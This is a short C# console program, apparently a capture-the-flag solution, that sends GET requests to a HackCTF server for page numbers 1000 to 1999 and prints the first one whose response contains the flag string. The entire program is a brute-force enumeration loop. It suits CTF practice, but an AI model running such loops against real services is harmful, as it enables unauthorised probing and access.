using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Http;

namespace ConsoleApp2
{
    class bruteforce
    {
        public static string GetRequest(String url, HttpMethod method, object param = null)
        {
            if (param != null)
            {
                StringBuilder parameter = new StringBuilder();
                foreach (var p in param.GetType().GetProperties())
                {
                    if (parameter.Length > 0)
                    {
                        parameter.Append("&");
                    }
                    parameter.AppendFormat("{0}={1}", p.Name, p.GetValue(param));
                }
                param = parameter.ToString();
            }
            else
            {
                param = "";
            }
            if(HttpMethod.Get.Equals(method))
            {
                if(url.Contains("?"))
                {
                    url += "&" + param;
                }
                else
                {
                    url += "?" + param;
                }
            }
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = method.ToString();
            request.ContentType = "application/x-www-form-urlencoded";
            request.Headers["Upgrade-Insecure-Requests"] = "1";  //서버에 요청 보냄
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())  // 응답 받음
            {
                
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    return reader.ReadToEnd();

                }

            
            }
        }
        static void Main(string[] args)
        {
            for (int i = 1000; i < 2000; i++)
            {
            String html = GetRequest("http://ctf.j0n9hyun.xyz:2025/?page="+i, HttpMethod.Get, new { param = "test" });
                if(html.Contains("HackCTF"))
                {
                    Console.WriteLine(i);
                    break;
                }
            
        }
        }
    }
}
